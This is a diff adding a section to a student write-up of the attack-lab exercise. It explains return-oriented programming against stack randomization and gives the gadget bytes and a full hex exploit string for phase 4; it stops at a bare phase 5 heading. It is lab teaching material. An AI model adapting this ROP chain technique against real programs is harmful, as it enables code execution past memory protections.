@@ -106,3 +106,35 @@ fa 18 40 00 c3 00 00 00
 ```
 35 39 62 39 39 37 66 61 is the ascii byte code of our cookie string, and 00 is the sign used in C to indicate the end of a string. The other part is similar to what we talk about in phase2. 
 
+
+## Phase 4 
+Unlike the previous case, we use a technique called return of programming to conduct the attacking. Why? Since the protection 
+makes it impossible to predict the position of stack frame pointers(stack randomization) and also prevent the injection code from running.
+
+In this part, we find the gadget from the gadget farm, and it's not difficult to find the instruction 58 90 c3
+```
+popq $rax
+nop
+ret
+```
+and also 48 89 c7 c3
+``` 
+movq $rax, $rdi
+ret
+```
+
+so we construct the solution as follows:
+```
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+ab 19 40 00 00 00 00 00
+fa 97 b9 59 00 00 00 00
+a2 19 40 00 00 00 00 00
+ec 17 40 00 00 00 00 00
+
+```
+
+## Phase 5
